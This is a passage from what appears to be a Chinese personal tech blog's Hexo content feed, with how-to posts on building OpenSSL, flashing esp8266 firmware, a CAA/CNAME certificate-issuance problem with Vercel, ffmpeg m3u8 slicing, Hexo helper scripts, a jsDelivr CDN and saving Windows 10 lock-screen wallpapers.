class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.openssl.org/source/openssl-1.1.1g.tar</span><br><span class="line">tar -xzf  openssl-1.1.1g.tar.gz</span><br><span class="line"><span class="built_in">cd</span> openssl-1.1.1g</span><br><span class="line">./config --prefix=/usr/local/openssl</span><br><span class="line">./config -t</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> 运维 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>esp8266固件的安装</title>
      
      
      <link href="/cn/posts/3450539282/"/>
      
      
      <url>/cn/posts/3450539282/</url>
      
      
        
      <content type="html"><![CDATA[<h3 id="安装驱动"><a href="#安装驱动" class="headerlink" title="安装驱动"></a>安装驱动</h3><p>首先需要安装驱动，你需要问问卖给你这个设备的卖家。</p><h3 id="安装固件"><a href="#安装固件" class="headerlink" title="安装固件"></a>安装固件</h3><blockquote><p>可以直接使用写好的脚本傻瓜式刷入</p><p>链接：<a href="https://pan.baidu.com/s/1ukUvB0x7mUhHkJWuoQy2fQ">https://pan.baidu.com/s/1ukUvB0x7mUhHkJWuoQy2fQ</a><br>提取码：b0hy</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/3450539282/image-20211005193224231.png" alt="image-20211005193224231"></p></blockquote><p>想自己安装的可以继续往下看</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>首先你需要安装依赖</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install esptool</span><br><span class="line">pip install pyserial</span><br></pre></td></tr></tbody></table></figure><p>接着就可以进行刷写固件了</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ./esptool.py --port COM13 write_flash 0x0000 ./firmware.bin</span><br></pre></td></tr></tbody></table></figure><p>这里的COM13可以使用设备管理器查看：</p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/3450539282/image-20211005183736379.png" style="zoom: 80%;"><h3 id="擦除"><a href="#擦除" class="headerlink" title="擦除"></a>擦除</h3><p><strong>擦除后所有数据都会消失，需要重新刷写固件</strong></p><p>擦除所有数据 (所有数据会变成 0xFF ):</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esptool.py erase_flash</span><br></pre></td></tr></tbody></table></figure><p>擦除指定区域的数据, 例如 从0x20000 到 0x4000   (共16KB):</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esptool.py erase_region 0x20000 0x4000</span><br></pre></td></tr></tbody></table></figure><p>地址和长度都必须是SPI flash erase扇区大小的倍数。也就是0x1000(4096)字节。</p><p>详情参见</p><p><a href="https://github.com/espressif/esptool">espressif/esptool: Espressif SoC serial bootloader utility (github.com)</a></p>]]></content>
      
      
      
      
      <categories>
        
          
          
        <category> 远程解锁 </category>
        
          
      
      </categories>
      
      
      
        
      <tags>
        
            
            
        <tag> esp8266 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>CNAME记录指向vercel影响了CAA记录导致的SSL证书无法签发的问题</title>
      
      
      <link href="/cn/posts/3655275721/"/>
      
      
      <url>/cn/posts/3655275721/</url>
      
      
        
      <content type="html"><![CDATA[<h3 id="直接看解决方案"><a href="#直接看解决方案" class="headerlink" title="直接看解决方案"></a>直接看解决方案</h3><p>最狠的：直接把dns中有关vercel全暂停了<br>或者：先暂停二级域名对vecel的解析，即暂停example.com-&gt;vecel<br>然后再暂停受影响的子域的vecel 即暂停 a.example.com-&gt;vecel </p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>今天阿里云告知我有一个域名的SSL证书快过期了，已经是老手的我熟练地打开阿里云控制台申请证书。</p><p>但是发生了一件怪事，以往证书都能在一分钟下发，而这一次等了好久都不行。我决定先睡一觉起来再看看。</p><p>睡醒以后，打开阿里云控制台，发现还是不成功，此时我仍然怀疑是阿里云的锅。于是我用freessl再申请了一次，等到下午还是没成功。用<a href="https://myssl.com/">myssl.com/</a>检测的结果如下：</p><table><thead><tr><th align="left">地区</th><th align="left">是否匹配</th></tr></thead><tbody><tr><td align="left">中国</td><td align="left">不匹配 (验证失败，您的CAA配置不允许当前CA为您签发证书，请修改为：symantec.com或digicert.com)</td></tr><tr><td align="left">香港</td><td align="left">不匹配 (验证失败，您的CAA配置不允许当前CA为您签发证书，请修改为：symantec.com或digicert.com)</td></tr><tr><td align="left">美国</td><td align="left">不匹配 (验证失败，您的CAA配置不允许当前CA为您签发证书，请修改为：symantec.com或digicert.com)</td></tr></tbody></table><p>我没设置过CAA记录啊！</p><p>我心想应该不是DNS缓存的问题吧？不可能啊！</p><p>但是我还是到阿里云控制台把所有的DNS记录都暂停解析。</p><p>结果，居然成功了！成功了！</p><p>后经过排查发现是解析到vercel上的cname记录导致的问题发生，这是为啥呢？vercel还有权限帮我设置CAA记录！？</p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>后经一番搜索终于知道了原因，就是因为CAA记录惹的祸</p><blockquote><p> CAA(Certificate Authority Authorization)，即证书颁发机构授权。是一项新的可以添加到DNS记录中的额外字段,通过DNS机制创建CAA资源记录，可以限定域名颁发的证书和CA（证书颁发机构）之间的联系。未经授权的第三方尝试通过其他CA注册获取用于该域名的SSL/TLS证书将被拒绝。</p><p>域名设置 CAA 记录，使网站所有者，可授权指定CA机构为自己的域名颁发证书，以防止HTTPS证书错误签发，从而提高网站安全性。</p></blockquote><p>补充一个知识点，CNAME记录会影响CAA记录：</p><p>CAA 记录检查继续对指向不同域的 CNAME 记录进行。在此例中，<a href="www.example.com">www.example.com</a> 指向 <a href="www.example.net">www.example.net</a> ，后者也有 CAA 记录：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(Example 7 / www.example.com)</span><br><span class="line">Domain   Record type  Flags  Tag      Value   </span><br><span class="line">www.example.com.   CNAME www.example.net</span><br><span class="line">www.example.net.   CAA           0      issue   ";"</span><br><span class="line"></span><br><span class="line">(Result: CAA failed)</span><br></pre></td></tr></tbody></table></figure><p>第一个记录将 CAA 检查转向 <a href="http://www.example.net.此/">www.example.net。此</a> CAA 记录可阻止任何 CA 颁发证书，证书办法机构无法为 <a href="http://www.example.com/">www.example.com</a> 颁发证书。</p><p>如果所指向的域 (<a href="http://www.example.net/">www.example.net</a>) 没有 CAA 记录，则 CAA 记录检查将上攀到基本域 (example.com)。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(Example 8 / www.example.com)</span><br><span class="line">Domain   Record type  Flags  Tag      Value   </span><br><span class="line">www.example.com.   CNAME www.example.net</span><br><span class="line">example.com.   CAA           0      issue   "amazon.com"</span><br><span class="line"></span><br><span class="line">(Result: CAA passed)</span><br></pre></td></tr></tbody></table></figure><p><strong>用白话说就是因为设置了cname指向vercel，而vercel设置了CAA记录，从而影响了我们的域名的CAA记录</strong>，用工具查询后发现确实如此：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  "canIssue": false,</span><br><span class="line">  "status": "IssueMismatch",</span><br><span class="line">  "domain": "czqu.net",</span><br><span class="line">  "queryAt": "Sep 30, 2021 11:21:55 AM",</span><br><span class="line">  "elapsed": 1,</span><br><span class="line">  "caaRecordSet": [</span><br><span class="line">    {</span><br><span class="line">      "domain": "czqu.net",</span><br><span class="line">      "caaRecords": [</span><br><span class="line">        {</span><br><span class="line">          "issuerCritical": 0,</span><br><span class="line">          "tag": "issue",</span><br><span class="line">          "value": "letsencrypt.org",</span><br><span class="line">          "type": 257,</span><br><span class="line">          "dclass": 1,</span><br><span class="line">          "ttl": 60</span><br><span class="line">        },</span><br><span class="line">        {</span><br><span class="line">          "issuerCritical": 0,</span><br><span class="line">          "tag": "issue",</span><br><span class="line">          "value": "globalsign.com",</span><br><span class="line">          "type": 257,</span><br><span class="line">          "dclass": 1,</span><br><span class="line">          "ttl": 60</span><br><span class="line">        }</span><br><span class="line">      ]</span><br><span class="line">    }</span><br><span class="line">  ]</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>因此阿里云使用的免费DigiCert 证书颁发机构无法给我的域名颁发证书。</p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> 后端 </tag>
        
            
            
        <tag> 踩坑 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>利用ffmpeg将MP4转换成m3u8格式的视频切片</title>
      
      
      <link href="/cn/posts/823464988/"/>
      
      
      <url>/cn/posts/823464988/</url>
      
      
        
      <content type="html"><![CDATA[<h4 id="1-获取ffmpeg"><a href="#1-获取ffmpeg" class="headerlink" title="1.获取ffmpeg"></a>1.获取ffmpeg</h4><p><a href="https://ffmpeg.org/download.html">打开这里下载</a></p><h4 id="2-视频切片"><a href="#2-视频切片" class="headerlink" title="2.视频切片"></a>2.视频切片</h4><p>第一步：mp4转成ts格式，一对一转换，转换后大小没什么变化。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -y -i 迪迦奥特曼.mp4 -vcodec copy -acodec copy -vbsf h264_mp4toannexb 迪迦奥特曼.ts</span><br></pre></td></tr></tbody></table></figure><p>第二步，按间隔分片，1对N，下面的5即“每个分片5秒”，可以自己切换。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i 迪迦奥特曼.ts -c copy -map 0 -f segment -segment_list playlist.m3u8 -segment_time 5 迪迦奥特曼%03d.ts</span><br></pre></td></tr></tbody></table></figure><p><strong>关于MP4的参数，务必满足视频编码为H264，音视频编码为AAC（YouTube下载的视频默认即此格式），如果不是请用格式工厂进行转换</strong></p><h4 id="3-完成"><a href="#3-完成" class="headerlink" title="3.完成"></a>3.完成</h4><p>把中间生成的ts文件清理</p><blockquote><p>推荐使用<a href="https://dplayer.js.org/">DPlayer</a>进行视频播放</p></blockquote>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> ffmpeg </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>hexo便捷使用方案</title>
      
      
      <link href="/cn/posts/1115750794/"/>
      
      
      <url>/cn/posts/1115750794/</url>
      
      
        
      <content type="html"><![CDATA[<h4 id="1-快速提交"><a href="#1-快速提交" class="headerlink" title="1.快速提交"></a>1.快速提交</h4><p>将以下内容保存为bat，然后放置在博客目录下</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git add -A </span><br><span class="line">git commit -m<span class="string">"%date:~0,4%%date:~5,2%%date:~8,2%%time:~0,2%%time:~3,2%%time:~6,2%"</span> </span><br><span class="line">git push -u origin master -f</span><br><span class="line">pause</span><br></pre></td></tr></tbody></table></figure><h4 id="2-快速预览"><a href="#2-快速预览" class="headerlink" title="2.快速预览"></a>2.快速预览</h4><p>将以下内容保存为bat，然后放置在博客目录下</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></tbody></table></figure><p>喜欢使用Windows Terminal的:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wt  -p <span class="string">"Windows Powershell"</span> -d . powershell -noExit <span class="string">"hexo s"</span></span><br></pre></td></tr></tbody></table></figure><p>在当前选项卡而不是新窗口打开:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wt --window 0 -p <span class="string">"Windows Powershell"</span> -d . powershell -noExit  <span class="string">"hexo s"</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> git </tag>
        
            
            
        <tag> hexo </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>jsDelivr+Github构建自己的免费CDN</title>
      
      
      <link href="/cn/posts/2220992601/"/>
      
      
      <url>/cn/posts/2220992601/</url>
      
      
        
      <content type="html"><![CDATA[<p>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科</p><p>放在Github的资源在国内加载速度比较慢，因此需要使用CDN加速来优化网站打开速度，jsDelivr + Github便是免费且好用的CDN，非常适合博客网站使用。</p><h2 id="1、新建Github仓库"><a href="#1、新建Github仓库" class="headerlink" title="1、新建Github仓库"></a>1、新建Github仓库</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/2220992601/image-20210928222424972-16328390699281.png" alt="image-20210928222424972"></p><h2 id="2、克隆Github仓库到本地"><a href="#2、克隆Github仓库到本地" class="headerlink" title="2、克隆Github仓库到本地"></a>2、克隆Github仓库到本地</h2><p>点击 Clone or download，一键复制仓库地址</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/2220992601/image-20210928222501925-16328391037672.png" alt="image-20210928222501925"></p><p>在本地目录右键 Git Bash Here，执行以下命令：</p><figure class="highlight console"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git  git clone 一键复制的仓库地址</span><br></pre></td></tr></tbody></table></figure><h2 id="3、上传资源"><a href="#3、上传资源" class="headerlink" title="3、上传资源"></a>3、上传资源</h2><p>复制需要上传的资源到本地git仓库（注：jsDelivr不支持加载超过20M的资源），在本地git仓库目录下右键 Git Bash Here，执行以下命令：</p><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git status                    //查看状态</span><br><span class="line">git add .                     //添加所有文件到暂存区</span><br><span class="line">git commit -m '第一次提交'      //把文件提交到仓库</span><br><span class="line">git push                      //推送至远程仓库</span><br></pre></td></tr></tbody></table></figure><h2 id="4、发布仓库"><a href="#4、发布仓库" class="headerlink" title="4、发布仓库"></a>4、发布仓库</h2><p>点击release发布</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/2220992601/image-20210928222544304-16328391457443.png" alt="image-20210928222544304"></p><p>自定义发布版本号</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/2220992601/image-20210928222621150-16328391831374.png" alt="image-20210928222621150"></p><h2 id="5、通过jsDelivr引用资源"><a href="#5、通过jsDelivr引用资源" class="headerlink" title="5、通过jsDelivr引用资源"></a>5、通过jsDelivr引用资源</h2><p>使用方法：<a href="https://link.zhihu.com/?target=https://cdn.jsdelivr.net/gh/">https://cdn.jsdelivr.net/gh/</a>你的用户名/你的仓库名@发布的版本号/文件路径</p><p>例如：</p><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://cdn.jsdelivr.net/gh/czqu/cdn@1.0/images/trhx.png</span><br><span class="line">https://cdn.jsdelivr.net/gh/czqu/cdn@2.0.1/css/style.css  </span><br><span class="line">https://cdn.jsdelivr.net/gh/czqu/cdn@3.1.3/test.mp4</span><br></pre></td></tr></tbody></table></figure><p>注意：版本号不是必需的，是为了区分新旧资源，如果不使用版本号，将会直接引用最新资源，除此之外还可以使用某个范围内的版本，查看所有资源等，具体使用方法如下：</p><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 加载任何Github发布、提交或分支</span><br><span class="line">https://cdn.jsdelivr.net/gh/user/repo@version/file</span><br><span class="line"></span><br><span class="line">// 加载 jQuery v3.2.1</span><br><span class="line">https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/dist/jquery.min.js</span><br><span class="line"></span><br><span class="line">// 使用版本范围而不是特定版本</span><br><span class="line">https://cdn.jsdelivr.net/gh/jquery/jquery@3.2/dist/jquery.min.js   https://cdn.jsdelivr.net/gh/jquery/jquery@3/dist/jquery.min.js</span><br><span class="line"> </span><br><span class="line">// 完全省略该版本以获取最新版本</span><br><span class="line">https://cdn.jsdelivr.net/gh/jquery/jquery/dist/jquery.min.js</span><br><span class="line"> </span><br><span class="line">// 将“.min”添加到任何JS/CSS文件中以获取缩小版本，如果不存在，将为会自动生成</span><br><span class="line">https://cdn.jsdelivr.net/gh/jquery/jquery@3.2.1/src/core.min.js</span><br><span class="line"> </span><br><span class="line">// 在末尾添加 / 以获取资源目录列表</span><br><span class="line">https://cdn.jsdelivr.net/gh/jquery/jquery/</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> hexo </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>保存Win10锁屏上的壁纸</title>
      
      
      <link href="/cn/posts/1037488110/"/>
      
      
      <url>/cn/posts/1037488110/</url>
      
      
        
      <content type="html"><![CDATA[<blockquote><p> 前言：一些用win10的同学可能都有这种感觉，win10的锁屏界面图片特别漂亮，但可惜的是不知道怎么将它保存下来，错过的可能再也找不回来了，因此本文将给大家介绍两种方法保存win10锁屏界面的图片。 </p></blockquote><h3 id="一、保存近期的锁屏壁纸："><a href="#一、保存近期的锁屏壁纸：" class="headerlink" title="一、保存近期的锁屏壁纸："></a>一、保存近期的锁屏壁纸：</h3><h3 id="1-打开资源管理器，在地址栏输入如下文字后回车"><a href="#1-打开资源管理器，在地址栏输入如下文字后回车" class="headerlink" title="1.打开资源管理器，在地址栏输入如下文字后回车"></a>1.打开资源管理器，在地址栏输入如下文字后回车</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%localappdata%\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1037488110/v2-29f0e41377d1f85b442814d2aa2eaaf9_b.png" alt="img"></p><h3 id="2-这时可以看到有很多未知文件，这些就是锁屏界面缓存的图片啦"><a href="#2-这时可以看到有很多未知文件，这些就是锁屏界面缓存的图片啦" class="headerlink" title="2.这时可以看到有很多未知文件，这些就是锁屏界面缓存的图片啦"></a>2.这时可以看到有很多未知文件，这些就是锁屏界面缓存的图片啦</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1037488110/v2-9cf2116d251c8578cf99406ad7d3663d_b.png" alt="img"></p><h3 id="3-然后我们把它复制到另一个文件夹，这里我复制到E盘的新建文件夹里"><a href="#3-然后我们把它复制到另一个文件夹，这里我复制到E盘的新建文件夹里" class="headerlink" title="3.然后我们把它复制到另一个文件夹，这里我复制到E盘的新建文件夹里"></a>3.然后我们把它复制到另一个文件夹，这里我复制到E盘的新建文件夹里</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1037488110/v2-c7ae640146f4b988c63aa50ff06595d3_b.png" alt="img"></p><h3 id="4-这时候按一下WIN-R键，在运行框输入cmd回车，然后在命令行里用命令定位到你刚才复制的文件夹，如下图"><a href="#4-这时候按一下WIN-R键，在运行框输入cmd回车，然后在命令行里用命令定位到你刚才复制的文件夹，如下图" class="headerlink" title="4.这时候按一下WIN+R键，在运行框输入cmd回车，然后在命令行里用命令定位到你刚才复制的文件夹，如下图"></a>4.这时候按一下WIN+R键，在运行框输入cmd回车，然后在命令行里用命令定位到你刚才复制的文件夹，如下图</h3><p> win键大概长下图这样 ：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1037488110/v2-941cb83b6e99c41612f6571822e4faa1_b.png" alt="img"></p><p>win键</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1037488110/v2-706ea8ccd76d5380025b6ba3daee1084_b.png" alt="img"></p><p>如果文件夹不在系统盘要注意红框这里，需要先切换到文件夹所在磁盘：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1037488110/v2-39f3f26fe7ff6ce7e735215f5b679c23_b.png" alt="img"></p><h3 id="5-在命令行里输入下面的命令后回车-这是一个批量重命名的命令，不懂可以不用深究，其实这里正确的格式应该是jfif-不过用jpg也没关系。"><a href="#5-在命令行里输入下面的命令后回车-这是一个批量重命名的命令，不懂可以不用深究，其实这里正确的格式应该是jfif-不过用jpg也没关系。" class="headerlink" title="5.在命令行里输入下面的命令后回车,这是一个批量重命名的命令，不懂可以不用深究，其实这里正确的格式应该是jfif,不过用jpg也没关系。"></a>5.在命令行里输入下面的命令后回车,这是一个批量重命名的命令，不懂可以不用深究，其实这里正确的格式应该是jfif,不过用jpg也没关系。</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ren *.*  *.jpg</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1037488110/v2-a87998b33ff9afd5bfa7cd2e060037e1_b.png" alt="img"></p><h3 id="6-大功告成，在文件夹内右键刷新一下，应该就能正常显示了（打码是为了避免图片侵权），如下图"><a href="#6-大功告成，在文件夹内右键刷新一下，应该就能正常显示了（打码是为了避免图片侵权），如下图" class="headerlink" title="6.大功告成，在文件夹内右键刷新一下，应该就能正常显示了（打码是为了避免图片侵权），如下图"></a>6.大功告成，在文件夹内右键刷新一下，应该就能正常显示了（打码是为了避免图片侵权），如下图</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1037488110/v2-c790fea58d3254b8df81d12c6a8e66cc_b.png" alt="img"></p><h3 id="二、保存当前的锁屏壁纸"><a href="#二、保存当前的锁屏壁纸" class="headerlink" title="二、保存当前的锁屏壁纸"></a>二、保存当前的锁屏壁纸</h3><h3 id="1-获取用户SID"><a href="#1-获取用户SID" class="headerlink" title="1.获取用户SID"></a>1.获取用户SID</h3><p>当前锁屏壁纸保存位置和你的用户SID有关系，一般锁屏图片存在如下位置：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\Microsoft\Windows\SystemData\&lt;Your-SID&gt;\ReadOnly\LockScreen_A</span><br></pre></td></tr></tbody></table></figure><p><your-sid>需要用命令行获取，有关命令行的使用方法上文已经有提到过</your-sid></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount where name='%username%' get sid</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1037488110/v2-c65295d8cbdde5726858f79524294df0_b.png" alt="img"></p><h3 id="2-设置安全属性打开此文件夹"><a href="#2-设置安全属性打开此文件夹" class="headerlink" title="2.设置安全属性打开此文件夹"></a>2.设置安全属性打开此文件夹</h3><p>由于此文件夹不能直接访问，我们需要首先设置安全属性，于是我们需要首先打开</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\Microsoft\Windows</span><br></pre></td></tr></tbody></table></figure><p>然后打开 SystemData 文件夹的高级安全属性设置，如下图：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1037488110/v2-7f428630d25ad9b8600d29eb1c97811e_b.png" alt="img"></p><p>先点更改然后点高级：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1037488110/v2-df9024a314c746d2227b562f03289866_b.png" alt="img"></p><p>点击立即查找，找到和你账户相同名字的用户就双击确认:</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1037488110/v2-aaee884720f232646269a8a0c027fe8c_b.png" alt="img"></p><p>那么现在文件夹的所有者应该已经变成了你，然后我们给替换字容器和对象的所有者打上勾，然后确定：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1037488110/v2-d2890fb1cc8b843f2519710e7cd950cf_b.png" alt="img"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1037488110/v2-41ad26a1fb68a7aedbbb576d1192f32f_b.png" alt="img"></p><h3 id="3-获取我们需要的图片"><a href="#3-获取我们需要的图片" class="headerlink" title="3.获取我们需要的图片"></a>3.获取我们需要的图片</h3><p>这时候我们应该可以打开 SystemData 文件夹了，这里面会有多个子文件夹，和上文获取到的&lt;Your-SID&gt;是对应的</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1037488110/v2-13a97252d9f0386f1a52a602fba5265a_b.png" alt="img"></p><p>此时我们打开与你账户对应的子文件夹，进入到上文提到的目录即可看到锁屏图片了：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1037488110/v2-853a98cad146252804bebdcb252c0e4a_b.png" alt="img"></p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Windows </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>Hexo自定义页面方法</title>
      
      
      <link href="/cn/posts/2603939427/"/>
      
      
      <url>/cn/posts/2603939427/</url>
      
      
        
